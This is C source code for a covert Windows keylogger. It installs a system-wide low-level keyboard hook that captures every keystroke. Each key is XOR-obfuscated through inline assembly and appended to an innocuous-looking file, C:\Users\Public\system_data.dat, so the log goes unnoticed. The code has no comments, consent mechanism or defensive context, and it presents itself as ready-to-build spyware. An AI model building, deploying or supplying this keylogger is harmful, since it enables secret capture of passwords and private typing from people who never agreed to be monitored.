#include <windows.h>
#include <stdio.h>


#define LOG_FILE "C:\\Users\\Public\\system_data.dat"
#define XOR_KEY 0x42  


HHOOK hKeyHook;


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
char EncryptByte(char data);
void WriteEncryptedLog(DWORD vkCode);


char EncryptByte(char data) {
    char result;
    __asm__ (
        "movb %1, %%al;"    
        "xorb %2, %%al;"    
        "movb %%al, %0;"    
        : "=r" (result)
        : "r" (data), "r" ((char)XOR_KEY)
        : "%al"
    );
    return result;
}


void WriteEncryptedLog(DWORD vkCode) {
    
    char data = (char)vkCode;
    char encrypted = EncryptByte(data);

    FILE *file = fopen(LOG_FILE, "ab"); 
    if (file) {
        fputc(encrypted, file);
        fclose(file);
    }
}


LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    
    if (nCode == HC_ACTION && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *pKeyBoard = (KBDLLHOOKSTRUCT *)lParam;
        WriteEncryptedLog(pKeyBoard->vkCode);
    }
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}


int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow) {
    
    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);

    
    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    
    UnhookWindowsHookEx(hKeyHook);
    return 0;
}
